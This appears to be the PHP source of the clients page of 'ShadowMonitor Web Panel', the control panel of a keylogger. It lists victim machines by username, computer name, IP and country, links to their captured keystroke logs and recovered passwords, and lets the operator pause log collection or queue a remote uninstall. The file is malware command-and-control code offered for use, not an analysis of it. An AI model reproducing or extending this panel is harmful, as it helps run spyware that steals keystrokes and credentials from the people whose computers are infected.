<?php
include 'include/panelSession.php';
include 'functions/GetOs.php';
include 'functions/GetStatus.php';
include 'functions/Settings.php';
$GetSettings = $Settings->Get();
$settings = explode("|", $GetSettings);
?>
<html>
<head>
<link rel = "icon" type = "image/png" href = "images/favicon.png"/>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="ShadowMonitor Web Panel" />
<meta name="author" content="" />

<title>ShadowMonitor Web Panel</title>

	<!-- Global stylesheets -->
	<link href="https://fonts.googleapis.com/css?family=Roboto:400,300,100,500,700,900" rel="stylesheet" type="text/css">
	<link href="assets/css/icons/icomoon/styles.css" rel="stylesheet" type="text/css">
	<link href="assets/css/icons/fontawesome/styles.min.css" rel="stylesheet" type="text/css">
	<link href="assets/css/bootstrap.css" rel="stylesheet" type="text/css">
	<link href="assets/css/core.css" rel="stylesheet" type="text/css">
	<link href="assets/css/components.css" rel="stylesheet" type="text/css">
	<link href="assets/css/colors.css" rel="stylesheet" type="text/css">
	<!-- /global stylesheets -->

	<!-- Core JS files -->
	<script type="text/javascript" src="assets/js/plugins/notifications/sweet_alert.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/loaders/pace.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.4/jquery-ui.min.js"></script>

	<script type="text/javascript" src="assets/js/core/libraries/bootstrap.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/loaders/blockui.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/notifications/pnotify.min.js"></script>
	<!-- /core JS files -->

	<!-- Theme JS files -->
	<!--Responsive datatables-->
	<script type="text/javascript" src="assets/js/plugins/tables/datatables/datatables.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/responsive.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/selects/select2.min.js"></script>
	<!--Switchery-->
	<script type="text/javascript" src="assets/js/plugins/forms/styling/uniform.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/styling/switchery.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/styling/switch.min.js"></script>
	
	<!-- Theme JS files -->
	<script type="text/javascript" src="assets/js/core/app.js"></script>
	<script type="text/javascript" src="assets/js/pages/components_notifications_pnotify.js"></script>
	<script type="text/javascript" src="assets/js/pages/datatables_responsive.js"></script>
	<script type="text/javascript" src="assets/js/pages/components_popups.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/validation/validate.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/selects/bootstrap_multiselect.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/inputs/touchspin.min.js"></script>
    <script type="text/javascript" src="assets/js/pages/form_validation.js"></script>
	<!--/ theme js files-->

	<!--Custom styles-->
	<link rel = "stylesheet" type = "text/css" href = "style/custom.css">

	<!--Custom Scripts-->
<script src = "js/InitiateSwitchery.js"></script>
<script src = "js/FilterActivity.js"></script>
</head>

<body>

<!-- Page container -->
<div class="page-container">

<!-- Page content -->
<div class="page-content">

<?php include 'navigation/sidebar.php'; ?>

<script>
$("#clients").addClass('active');
</script>

<!-- Main content -->
<div class="content-wrapper">

<!-- Content area -->
<div class="content">
<?php include 'accountManager.php'; ?>

<?php
$activity[0] = "";
$activity[1] = "checked";
?>

<!--Clients-->
<div class = "panel panel-flat">
<div class = "panel-heading">
<center>
<div class = "panel-title"><span class = "text-bold">Clients</span></div>
</center>
</div>
<div class = "panel-body">
<table class = "table datatable-responsive" id = "clientsTbl">
<div style = "float:left; position:relative; top: 10px;">
<div class="checkbox checkbox-switchery">
<label>
<?php
$showUninstalled[0] = "";
$showUninstalled[1] = "checked";
?>
<input type="checkbox" class="switchery" id = "ShowUninstalled" <?php echo $showUninstalled[$settings[2]]; ?>>
Show Uninstalled
</label>
</div>
</div>
<thead>
<tr style = "text-align:center">
<th>Username</th>
<th>Computer Name</th>
<th>OS</th>
<th>Ip</th>
<th>Country</th>
<th>Submission Date</th>
<th>Last Activity</th>
<th>Activity</th>
<th>Status</th>
<th>Action</th>
<th>Command</th>
</tr>
</thead>
<tbody id = "clientsHolder">
<?php
if ($settings[2] == "1") {$uninstalledState = "Where allClients.uninstalled = 1 || allClients.uninstalled = 0";} else {$uninstalledState = "Where allClients.uninstalled = 0";}
$clients = $server->query("
select allClients.auto,
allClients.id clientId,
allClients.username,
allClients.pcname,
allClients.os,
allClients.osImg,
allClients.ip,
allClients.country,
allClients.submissionDate,
allClients.lastActivity,
allClients.activity,
allClients.status,
allClients.uninstalled,
allCommands.status commandStatus,
allCommands.type commandType
From clients allClients left join commands allCommands on (allClients.id = allCommands.id) and allCommands.type = 0 ".$uninstalledState." order by auto desc
");

$allowRemove = "";
while ($client = $clients->fetch(PDO::FETCH_ASSOC)) {
?>
<tr <?php echo $allowRemove; ?> id = "client<?php echo $client['auto']; ?>" class = "<?php echo $client['clientId']; ?>" style = "text-align:center">
<!--Username-->
<td class = "clientUsername"><?php echo $client['username']; ?></td>
<!--Computer Name-->
<td class = "clientPcName"><?php echo $client['pcname']; ?></td>
<!--Opearting System-->
<td>
<img src = "images/os/<?php echo $client['osImg']; ?>"><br>
<?php echo GetOs($client['os']); ?>
</td>
<!--Ip-->
<td>
<a data-popup = "tooltip" data-placement = "top" title = "Lookup!" href = "http://ip-lookup.net/index.php?ip=<?php echo $client['ip']; ?>" target = "_blank"><?php echo $client['ip']; ?></a>
</td>
<!--Country-->
<td><?php echo $client['country']; ?></td>
<!--Submission Date-->
<td><?php echo $client['submissionDate']; ?></td>
<!--Last activity-->
<td>
<?php echo $client['lastActivity']; ?>
</td>
<!--Activity-->
<td>
<div class="checkbox checkbox-switchery">
<label>
<input type="checkbox" class="switchery ClientActivity" <?php echo $activity[$client['activity']]; ?> data-autoIncrement = "<?php echo $client['auto']; ?>" onClick = "ClientActivity($(this));">
</label>
</div>
</td>
<!--Status-->
<td>
<?php
echo GetStatus($client['status']);
?>
</td>
<!--Actions-->
<td>
<a class = "actionBtn" data-popup = "tooltip" data-placement = "top" title = "Payload Details" type = "button" href = "clientPayload.php?id=<?php echo $client['clientId']; ?>"><i class = "icon-info22 actionIcon"></i></a>
<?php if ($client['commandStatus'] == "") { ?>
<i data-popup = "tooltip" data-placement = "top" title = "Remote Uninstall" class = "fa fa-remove actionIcon" onClick = "RemoteUninstall($(this));" data-autoIncrement = "<?php echo $client['auto']; ?>" data-clientId = "<?php echo $client['clientId']; ?>"></i>
<?php } ?>
<a class = "actionBtn" data-popup = "tooltip" data-placement = "top" title = "View Logs" type = "button" href = "keylogger.php?clientId=<?php echo $client['clientId']; ?>"><i class = "icon-stack-text actionIcon"></i></a>
<a class = "actionBtn" data-popup = "tooltip" data-placement = "top" title = "View Recoveries" type = "button" href = "passRecoveries.php?clientId=<?php echo $client['clientId']; ?>"><i class = "icon-lock2 actionIcon"></i></a>
</td>
<!--Command-->
<td>
<?php
switch (true) {
case $client['commandStatus'] == "" ?>
-
<?php
break; 
case $client['commandStatus'] == 0: ?>
<a class = "actionBtn" data-popup = "tooltip" data-placement = "top" title = "Uninstall Pending" href = "commands.php?clientId=<?php echo $client['clientId']; ?>"><i class = "fa fa-remove actionIcon"></i></a>
<?php
break;
case 1: ?>
<a class = "actionBtn" data-popup = "tooltip" data-placement = "top" title = "Uninstall Executed" href = "commands.php?clientId=<?php echo $client['clientId']; ?>"><i class = "icon-check actionIcon"></i></a>
<?php
break;
case 2: ?>
<a class = "actionBtn" data-popup = "tooltip" data-placement = "top" title = "Uninstall Canceled" href = "commands.php?clientId=<?php echo $client['clientId']; ?>"><i class = "fa fa-remove actionIcon"></i></a>
<?php
break;
} ?>
</td>
</tr>
<?php } ?>
</tbody>
</table>
</div>
</div>

</div>
<!--/content area end-->
</div>
<!--/content wrapper end-->
</div>
<!--/page content end-->
</div>
<!--/page container end-->

<!--Scripts-->
<script src = "js/FetchNewClient.js"></script>

<!--Main script-->
<script>
//Initialize tooltip
$('[data-popup="tooltip"]').tooltip();

//Toggle client activity
function ClientActivity(toggle) {
var clientId = $(toggle).attr('data-autoIncrement');
var clientUsername = $("#client" + clientId).find(".clientUsername").text();
var activity = FilterActivity($(toggle).prop('checked'));

if (activity == 0) {
msgType = "warning";
msgTitle = "Activity Change";
msgText = "You will temporary <b>stop</b> receiving logs from " + clientUsername + ", proceed?";
} else {
msgType = "info";
msgTitle = "Activity Change";
msgText = "You will <b>start</b> receiving logs from " + clientUsername + ", proceed?";
}

swal({
type: msgType,
html: true,
title: msgTitle,
text: msgText,
showCancelButton: true,
showConfirmButton: true,
cancelButtonText: "No",
confirmButtonText: "Yes",
closeOnConfirm: false},
function(confirmed) {
if (confirmed) {
$.ajax({
type: "POST",
data: {clientId: clientId, activity: activity},
cache: false,
url: "cms/clientActivity.php",
success: function() {
swal({
type: "success",
html: true,
title: "Success",
text: "Operation was <b>complete</b>!",
showCancelButton: false,
showConfirmButton: true
});
}
});
} else {$(toggle).trigger('click');}
});
}

//Sets an uninstall command for the target machine
function RemoteUninstall(target) {
var clientAuto = $(target).attr('data-autoIncrement');
var clientId = $(target).attr('data-clientId');
var clientElement = $("#client" + clientAuto);
var clientPcName = $(clientElement).find(".clientPcName").text();

swal({
type: "warning",
html: true,
title: "Uninstall ShadowMonitor",
text: "ShadowMonitor keylogger will be uninstalled from " + clientPcName + " <b>permanently</b>, proceed?",
showCancelButton: true,
showConfirmButton: true,
cancelButtonText: "No",
confirmButtonText: "Yes",
closeOnConfirm: false},
function(confirmed) {
if (confirmed) {
$.ajax({
type: "POST",
data: {cmd : 0, clientId: clientId},
cache: false,
async: false,
url: "commands/QueueCommand.php",
success: function(callback) {
PendingUninstallBtn = "<a class = 'actionBtn' data-popup = 'tooltip' data-placement = 'top' title = 'Uninstall Pending' href = 'commands.php?clientId=" + clientId + "'><i class = 'fa fa-remove actionIcon'></i></a>";
$(clientElement).find('td:last').html(PendingUninstallBtn);
$('[data-popup="tooltip"]').tooltip();
$(target).remove();
swal({
type: "success",
html: true,
title: "Operation Complete",
text: "The uninstall process will be executed on " + clientPcName + " at next windows <b>startup</b>.",
showConfirmButton: true,
showCancelButton: false
});
}
});
}
});
}

$(document).ready(function() {
//Initialize switchery
InitiateSwitcheries(".switchery");

//Initialize datatable
clientsTbl = $("#clientsTbl").DataTable({
"paging":   true,
"ordering": false,
"info":     true,
stateSave: false
});

$("#ShowUninstalled").click(function() {
var showUninstalled = FilterActivity($(this).prop('checked'));
$.ajax({
type: "POST",
data: {showUninstalled: showUninstalled},
cache: false,
url: "functions/showUninstalled.php",
success: function() {
location.reload();
}
});
});

});
</script>

<!--Required-->
<script src = "js/datatables/InitiatePaging.js"></script>
<script src = "js/datatables/InitiateFiltering.js"></script>
</body>
</html>